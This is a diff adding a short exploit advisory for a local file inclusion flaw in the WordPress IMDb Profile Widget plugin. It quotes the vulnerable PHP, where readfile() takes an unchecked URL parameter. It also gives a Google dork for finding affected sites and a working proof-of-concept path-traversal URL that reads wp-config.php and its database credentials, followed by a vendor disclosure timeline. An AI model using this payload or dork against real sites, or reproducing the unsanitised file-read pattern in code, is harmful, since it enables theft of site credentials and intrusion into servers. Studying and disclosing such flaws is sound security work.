@@ -1,0 +1,21 @@
+# Exploit Title: Wordpress Plugin IMDb Profile Widget - Local File Inclusion
+# Exploit Author: CrashBandicot @DosPerl
+# Date: 2016-03-26
+# Google Dork : inurl:/wp-content/plugins/imdb-widget
+# Vendor Homepage: https://wordpress.org/plugins/imdb-widget/
+# Tested on: MSWin32
+# Version: 1.0.8
+
+# Vuln file : pic.php
+
+<?php
+
+header( 'Content-Type: image/jpeg' );
+readfile( $_GET["url"] );
+
+
+# PoC : /wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
+# Right click -> Save As -> rename pic.jpg in .txt and read file
+
+# 26/03/2016 - Informed Vendor about Issue
+# 27/03/2016 - Waiting Reply
